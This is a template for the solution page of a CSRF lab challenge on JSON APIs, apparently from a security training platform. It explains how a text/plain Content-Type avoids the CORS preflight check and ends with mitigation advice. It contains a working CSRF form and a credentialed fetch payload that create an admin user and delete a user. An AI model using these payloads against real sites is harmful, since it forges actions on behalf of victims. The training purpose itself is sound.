{% extends 'base.html' %}

{% block title %}CSRF Level 3 Solution - R00tGlyph{% endblock %}

{% block content %}
<div class="row">
    <div class="col-md-10 offset-md-1">
        <div class="card">
            <div class="card-header bg-dark text-white">
                <h2 class="text-center">CSRF Level 3 Solution: JSON CSRF</h2>
            </div>
            <div class="card-body">
                <div class="alert alert-info">
                    <h4><i class="bi bi-info-circle-fill me-2"></i>Challenge Overview</h4>
                    <p>This challenge demonstrates CSRF attacks against JSON APIs by manipulating Content-Type headers to bypass CORS preflight checks.</p>
                </div>

                <div class="card mb-4">
                    <div class="card-header bg-primary text-white">
                        <h5 class="mb-0"><i class="bi bi-bullseye me-2"></i>Attack Vector</h5>
                    </div>
                    <div class="card-body">
                        <p>Modern web applications often use JSON APIs that can be vulnerable to CSRF if they don't properly validate the Content-Type header or implement CSRF protection. Attackers can use simple Content-Types to avoid CORS preflight checks.</p>
                    </div>
                </div>

                <div class="card mb-4">
                    <div class="card-header bg-warning text-white">
                        <h5 class="mb-0"><i class="bi bi-tools me-2"></i>Tools Needed</h5>
                    </div>
                    <div class="card-body">
                        <ul>

                            <li>Web browser with developer tools</li>
                            <li>Understanding of CORS and preflight requests</li>
                            <li>Knowledge of Content-Type manipulation</li>
                            <li>Burp Suite or similar proxy tool</li>
                        </ul>
                    </div>
                </div>

                <div class="card mb-4">
                    <div class="card-header bg-success text-white">
                        <h5 class="mb-0"><i class="bi bi-code-slash me-2"></i>Payload Example</h5>
                    </div>
                    <div class="card-body">
                        <pre class="bg-dark text-light p-3 rounded"><code><!-- HTML form with text/plain to avoid preflight -->
<form action="http://target.com/csrf/level3" method="POST" enctype="text/plain">
    <input name='{"api_endpoint":"/api/admin/create","json_payload":"{\"action\":\"create\",\"user\":\"admin\"}","content_type":"application/json","extra":"' value='"}'>
</form>

<!-- JavaScript with simple Content-Type -->
<script>
fetch('http://target.com/api/endpoint', {
    method: 'POST',
    headers: {'Content-Type': 'text/plain'},
    body: '{"action":"delete","user_id":123}',
    credentials: 'include'
});
</script></code></pre>
                    </div>
                </div>

                <div class="card mb-4">
                    <div class="card-header bg-danger text-white">
                        <h5 class="mb-0"><i class="bi bi-shield-check me-2"></i>Mitigation Strategies</h5>
                    </div>
                    <div class="card-body">
                        <p>Implement proper CSRF tokens for all API endpoints, validate Content-Type headers strictly, use custom headers that trigger CORS preflight, and implement proper CORS policies with credential validation.</p>
                    </div>
                </div>

                <div class="text-center mt-4">
                    <a href="/csrf/level3" class="btn btn-primary me-2">
                        <i class="bi bi-arrow-left me-1"></i>Back to Challenge
                    </a>
                    <a href="/challenges" class="btn btn-secondary">
                        <i class="bi bi-list me-1"></i>All Challenges
                    </a>
                </div>
            </div>
        </div>
    </div>
</div>
{% endblock %}